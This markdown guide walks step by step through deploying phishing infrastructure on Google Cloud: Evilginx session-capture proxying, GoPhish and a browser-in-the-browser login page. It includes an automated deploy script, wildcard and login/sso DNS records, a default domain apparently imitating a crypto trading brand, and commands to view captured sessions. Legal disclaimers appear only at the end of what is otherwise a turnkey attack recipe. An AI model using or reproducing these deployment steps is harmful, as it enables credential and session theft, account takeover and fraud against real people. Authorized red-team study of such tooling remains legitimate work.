# 🚀 Google Cloud Platform - Complete Setup Guide

## 📋 Starting from ABSOLUTE ZERO to Fully Functional Phishing Infrastructure

**Total Time:** 45-60 minutes (mostly automated)
**Cost:** ~$30-40/month (or FREE with $300 GCP credit)
**Difficulty:** Easy - Just follow the steps!

---

## 🎯 Two Deployment Methods

### Method 1: Fully Automated (RECOMMENDED) ⚡
**One command deployment** - Everything automated!
- ✅ Creates GCP project
- ✅ Creates VM instance
- ✅ Configures firewall
- ✅ Installs all software
- ✅ **Time: 45 minutes (hands-off)**

### Method 2: Manual Step-by-Step 📝
**Full control** - Configure everything yourself
- ✅ Detailed instructions
- ✅ Understand each component
- ✅ **Time: 60 minutes (hands-on)**

---

## 🔥 Method 1: FULLY AUTOMATED DEPLOYMENT (EASIEST!)

### Prerequisites:
1. Google Cloud account (create at: https://cloud.google.com/)
2. Domain name (e.g., exodustraderai.info)
3. 5 minutes of your time

### Step 1: Install gcloud CLI

**On your local machine:**

#### macOS:
```bash
curl https://sdk.cloud.google.com | bash
exec -l $SHELL
gcloud init
```

#### Linux:
```bash
curl https://sdk.cloud.google.com | bash
exec -l $SHELL
gcloud init
```

#### Windows:
Download from: https://cloud.google.com/sdk/docs/install

### Step 2: Authenticate
```bash
gcloud auth login
```

### Step 3: Download Deployment Script
```bash
# Download the deployment script
curl -O https://raw.githubusercontent.com/waelmas/frameless-bitb/main/gcp-deploy.sh

# Or clone the repo
git clone https://github.com/waelmas/frameless-bitb.git
cd frameless-bitb
```

### Step 4: Run Deployment
```bash
# Default deployment (exodustraderai.info)
bash gcp-deploy.sh

# Or with custom domain
DOMAIN=yourdomain.com EMAIL=admin@yourdomain.com bash gcp-deploy.sh
```

### Step 5: Configure DNS
The script will display your server IP. Add these DNS records:

```
Type: A    Name: @         Value: YOUR_SERVER_IP
Type: A    Name: *         Value: YOUR_SERVER_IP
Type: A    Name: login     Value: YOUR_SERVER_IP
Type: A    Name: account   Value: YOUR_SERVER_IP
Type: A    Name: www       Value: YOUR_SERVER_IP
Type: A    Name: sso       Value: YOUR_SERVER_IP
Type: A    Name: portal    Value: YOUR_SERVER_IP
```

### Step 6: Wait for Installation
The script will automatically:
- ✅ Create GCP project
- ✅ Reserve static IP
- ✅ Create VM instance
- ✅ Configure firewall
- ✅ Install Evilginx
- ✅ Install GoPhish
- ✅ Configure Apache
- ✅ Setup SSL certificates
- ✅ Start all services

**Installation takes 15-30 minutes. The script will show progress.**

### Step 7: Access Your Setup

**Phishing Page:**
```
https://login.exodustraderai.info/?auth=2
```

**GoPhish Admin:**
```
https://YOUR_SERVER_IP:3333
```

**SSH Access:**
```bash
gcloud compute ssh evilginx-server --zone=us-central1-a
```

### Step 8: Verify
```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Run validation
sudo bash test-setup.sh

# Check services
bitb-status
```

**DONE! You're ready to phish! 🎣**

---

## 📝 Method 2: MANUAL STEP-BY-STEP DEPLOYMENT

### Full documentation: [GCP-SETUP.md](GCP-SETUP.md)

### Quick Overview:

1. **Create Google Cloud Account**
   - Go to: https://cloud.google.com/
   - Get $300 free credit

2. **Create New Project**
   - Console: https://console.cloud.google.com/
   - Click "NEW PROJECT"
   - Name: `frameless-bitb-phishing`

3. **Enable Billing**
   - https://console.cloud.google.com/billing
   - Link billing account

4. **Enable Compute Engine API**
   - https://console.cloud.google.com/apis/library
   - Search "Compute Engine"
   - Click "ENABLE"

5. **Create VM Instance**
   ```
   Name: evilginx-server
   Region: us-central1
   Zone: us-central1-a
   Machine type: e2-medium (2 vCPU, 4 GB)
   Boot disk: Ubuntu 22.04 LTS, 30 GB
   Firewall: Allow HTTP and HTTPS
   ```

6. **Configure Firewall Rules**
   - Allow HTTP (port 80)
   - Allow HTTPS (port 443)
   - Allow DNS (port 53)
   - Allow GoPhish (port 3333, your IP only)

7. **Reserve Static IP**
   - VPC Network > IP Addresses
   - Reserve external static address
   - Attach to instance

8. **Configure DNS**
   - Point domain to static IP
   - Add wildcard record
   - Add subdomain records

9. **SSH into Instance**
   ```bash
   gcloud compute ssh evilginx-server --zone=us-central1-a
   ```

10. **Run Installation**
    ```bash
    git clone https://github.com/waelmas/frameless-bitb.git
    cd frameless-bitb
    sudo bash setup-gcloud.sh
    ```

**For detailed instructions, see: [GCP-SETUP.md](GCP-SETUP.md)**

---

## 📊 Cost Breakdown

### Monthly Costs:

| Resource | Specification | Cost/Month |
|----------|--------------|------------|
| VM Instance | e2-medium (2 vCPU, 4 GB) | $25-30 |
| Storage | 30 GB SSD | $5 |
| Static IP | 1 IPv4 | $3 |
| Bandwidth | 1-10 GB | $0-1 |
| **Total** | | **$33-39** |

### Free Tier:
- ✅ $300 credit for 90 days
- ✅ Covers 7-9 months of operation
- ✅ Always free tier available after credit expires

### Cost Optimization:

**Use e2-small (cheaper):**
```bash
MACHINE_TYPE=e2-small bash gcp-deploy.sh
```
**Cost:** ~$12-15/month

**Stop when not in use:**
```bash
gcloud compute instances stop evilginx-server --zone=us-central1-a
```
**Cost:** $0 (only pay for storage ~$5/month)

**Use preemptible instances (70% cheaper):**
```bash
gcloud compute instances create evilginx-server --preemptible
```
**Cost:** ~$10/month (can be shut down by Google anytime)

---

## 🎮 Management Commands

### Via gcloud CLI:

```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# View installation logs
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo tail -f /var/log/evilginx-startup.log'

# Check service status
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='bitb-status'

# View logs
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='bitb-logs'

# Stop instance
gcloud compute instances stop evilginx-server --zone=us-central1-a

# Start instance
gcloud compute instances start evilginx-server --zone=us-central1-a

# Restart instance
gcloud compute instances reset evilginx-server --zone=us-central1-a

# Delete instance
gcloud compute instances delete evilginx-server --zone=us-central1-a
```

### Via Web Console:

- **Instances:** https://console.cloud.google.com/compute/instances
- **Firewall:** https://console.cloud.google.com/networking/firewalls/list
- **IP Addresses:** https://console.cloud.google.com/networking/addresses/list
- **Logs:** https://console.cloud.google.com/logs

---

## 🔍 Monitoring & Debugging

### Check Installation Progress:
```bash
# View real-time installation logs
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo tail -f /var/log/evilginx-startup.log'
```

### Check Services:
```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Once inside, run:
bitb-status     # Check all services
bitb-logs       # View logs
```

### Run Validation:
```bash
# SSH into server first
gcloud compute ssh evilginx-server --zone=us-central1-a

# Run validation
sudo bash /root/frameless-bitb/test-setup.sh
```

### View Captured Sessions:
```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Run integration tool
sudo bash /root/frameless-bitb/gophish-integration.sh
```

---

## 🔧 Troubleshooting

### Issue: Cannot create project

**Solution:**
- Check billing is enabled
- Verify account permissions
- Try different project name

### Issue: Quota exceeded

**Solution:**
```bash
# Check quotas
gcloud compute project-info describe --project=YOUR_PROJECT

# Request quota increase
# Go to: https://console.cloud.google.com/iam-admin/quotas
```

### Issue: VM creation fails

**Solution:**
- Check region/zone availability
- Verify machine type is available
- Try different region: `REGION=us-east1 ZONE=us-east1-b bash gcp-deploy.sh`

### Issue: Cannot SSH into instance

**Solution:**
```bash
# Check instance is running
gcloud compute instances list

# Check firewall allows SSH
gcloud compute firewall-rules list

# Try web-based SSH
# https://console.cloud.google.com/compute/instances
# Click "SSH" button
```

### Issue: Services not starting

**Solution:**
```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Check logs
sudo journalctl -u evilginx -n 50
sudo journalctl -u gophish -n 50
sudo journalctl -u apache2 -n 50

# Fix DNS stub listener
sudo sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved

# Restart services
bitb-stop && bitb-start
```

### Issue: DNS not resolving

**Solution:**
- Wait 5-30 minutes for DNS propagation
- Check DNS records at registrar
- Verify with: `dig exodustraderai.info`
- Check global propagation: https://www.whatsmydns.net/

### Issue: SSL certificate fails

**Solution:**
```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Check if Let's Encrypt is being used
sudo ls -la /etc/letsencrypt/live/

# If not, self-signed certs are created automatically at:
sudo ls -la /etc/ssl/localcerts/exodustraderai.info/

# Restart Apache
sudo systemctl restart apache2
```

---

## 🔒 Security Best Practices

### 1. Restrict GoPhish Admin Access

Update firewall to only allow your IP:
```bash
gcloud compute firewall-rules update allow-gophish-admin \
  --source-ranges=YOUR_IP/32
```

### 2. Setup SSH Key Authentication

```bash
# Generate SSH key
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

# Add to GCP
gcloud compute os-login ssh-keys add --key-file=~/.ssh/id_rsa.pub
```

### 3. Enable OS Login

```bash
gcloud compute instances add-metadata evilginx-server \
  --zone=us-central1-a \
  --metadata enable-oslogin=TRUE
```

### 4. Setup Automatic Snapshots

```bash
# Create snapshot schedule
gcloud compute resource-policies create snapshot-schedule daily-backup \
  --region=us-central1 \
  --max-retention-days=7 \
  --on-source-disk-delete=keep-auto-snapshots \
  --daily-schedule \
  --start-time=03:00

# Attach to disk
gcloud compute disks add-resource-policies evilginx-server \
  --zone=us-central1-a \
  --resource-policies=daily-backup
```

### 5. Enable Cloud Logging

```bash
# Install logging agent (runs during installation automatically)
# View logs at: https://console.cloud.google.com/logs
```

---

## 📊 Monitoring Setup

### Setup Uptime Monitoring:

```bash
# Via gcloud
gcloud alpha monitoring uptime create https-check \
  --display-name="Evilginx HTTPS Check" \
  --resource-type=uptime-url \
  --monitored-resource=https://exodustraderai.info
```

**Or via Console:**
1. Go to: https://console.cloud.google.com/monitoring/uptime
2. Click "CREATE UPTIME CHECK"
3. Configure check for your domain

### Setup Alerting:

1. Go to: https://console.cloud.google.com/monitoring/alerting
2. Click "CREATE POLICY"
3. Configure alerts for:
   - Instance down
   - High CPU usage
   - High disk usage
   - Failed uptime checks

---

## 🗑️ Cleanup (Delete Everything)

### Quick Cleanup:
```bash
# Delete instance
gcloud compute instances delete evilginx-server --zone=us-central1-a --quiet

# Delete static IP
gcloud compute addresses delete evilginx-static-ip --region=us-central1 --quiet

# Delete firewall rules
gcloud compute firewall-rules delete allow-http-evilginx --quiet
gcloud compute firewall-rules delete allow-https-evilginx --quiet
gcloud compute firewall-rules delete allow-dns-evilginx --quiet
gcloud compute firewall-rules delete allow-gophish-admin --quiet
```

### Delete Entire Project:
```bash
# WARNING: This deletes EVERYTHING in the project!
gcloud projects delete frameless-bitb-phishing
```

---

## 📚 Additional Resources

### Official Documentation:
- [GCP Free Tier](https://cloud.google.com/free)
- [Compute Engine Docs](https://cloud.google.com/compute/docs)
- [gcloud CLI Reference](https://cloud.google.com/sdk/gcloud/reference)
- [GCP Pricing Calculator](https://cloud.google.com/products/calculator)

### Frameless BITB Docs:
- [GCP-SETUP.md](GCP-SETUP.md) - Detailed manual setup
- [INSTALL.md](INSTALL.md) - Installation guide
- [QUICKSTART.md](QUICKSTART.md) - Quick reference
- [README.md](README.md) - Project overview

### Video Tutorials:
- [Original Frameless BITB Demo](https://youtu.be/luJjxpEwVHI)
- [Evilginx Mastery Course](https://academy.breakdev.org/evilginx-mastery)

---

## ✅ Pre-Launch Checklist

Before running phishing campaigns:

- [ ] VM instance created and running
- [ ] Static IP reserved and attached
- [ ] Firewall rules configured correctly
- [ ] DNS records pointing to server
- [ ] DNS propagated (check with `dig`)
- [ ] Installation completed (check `/var/log/evilginx-startup.log`)
- [ ] All services running (`bitb-status`)
- [ ] SSL certificates valid (check in browser)
- [ ] Phishing page accessible
- [ ] GoPhish admin accessible
- [ ] GoPhish password changed from default
- [ ] Backups/snapshots configured
- [ ] Monitoring/alerting setup
- [ ] **Legal authorization obtained**
- [ ] **Scope documented**
- [ ] **Rules of engagement agreed upon**

---

## ⚖️ Legal & Ethical Use

**⚠️ CRITICAL WARNING ⚠️**

This tool is for **AUTHORIZED SECURITY TESTING ONLY**.

### Legitimate Use Cases:
- ✅ Security awareness training (with permission)
- ✅ Authorized penetration testing
- ✅ Red team exercises
- ✅ Security research
- ✅ Educational demonstrations

### Illegal Use Cases:
- ❌ Unauthorized access to systems
- ❌ Stealing credentials
- ❌ Identity theft
- ❌ Fraud
- ❌ Any malicious activity

### Legal Requirements:
1. **Get written authorization** before testing
2. **Define clear scope** of testing
3. **Document everything**
4. **Follow applicable laws** (Computer Fraud and Abuse Act, GDPR, etc.)
5. **Report findings responsibly**

**Unauthorized use can result in:**
- Criminal prosecution
- Civil lawsuits
- Fines and imprisonment
- Professional consequences

**USE RESPONSIBLY - GET AUTHORIZATION - FOLLOW THE LAW**

---

## 🎉 Success!

If you've followed this guide, you now have:

✅ **Fully functional Google Cloud infrastructure**
✅ **Automated Evilginx deployment**
✅ **GoPhish campaign management**
✅ **Frameless BITB implementation**
✅ **SSL certificates configured**
✅ **Monitoring and logging setup**
✅ **Management tools installed**

**You're ready to conduct authorized security testing! 🎣**

---

## 📞 Support

- **GitHub Issues:** https://github.com/waelmas/frameless-bitb/issues
- **Original Author:** [@waelmas](https://github.com/waelmas)
- **Evilginx:** [@kgretzky](https://github.com/kgretzky)
- **GoPhish:** [GoPhish Team](https://github.com/gophish/gophish)

---

## 🙏 Credits

- **Frameless BITB:** [@waelmas](https://github.com/waelmas)
- **Original BITB:** [@mrd0x](https://github.com/mrd0x)
- **Evilginx:** [@kgretzky](https://github.com/kgretzky)
- **GoPhish:** [GoPhish Team](https://github.com/gophish/gophish)
- **Google Cloud Platform:** [Google](https://cloud.google.com)

---

**Made with ❤️ for ethical security testing**

**NOW GO HACK THE PLANET (RESPONSIBLY)! 🌍🔒**
